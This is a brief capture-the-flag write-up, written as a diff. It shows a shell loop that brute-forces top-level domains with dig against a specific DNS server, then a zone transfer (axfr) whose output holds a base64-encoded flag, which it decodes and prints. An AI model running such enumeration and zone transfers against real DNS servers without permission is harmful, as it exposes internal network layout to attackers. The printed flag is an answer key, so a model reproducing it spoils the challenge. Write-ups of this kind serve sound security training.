@@ -1,0 +1,15 @@
+gather all tld's in a file
+brute force the dns service
+
+for i in `cat tld`; do
+ dig +tcp -p 2211 deans-transfers$i @46.101.107.117 any
+done
+
+you find deans-transfers.express
+
+then do a zone transfers
+
+dig axfr +tcp -p 2211 deans-transfers.express @46.101.107.117
+
+reveals: aGUyMDIye2QzNG5fZHIxdjNzX3lvdV8zdjNyeXdoM3IzISF9.deans-transfers.express. 302400 IN A 10.0.0.8
+base64: he2022{d34n_dr1v3s_you_3v3rywh3r3!!}
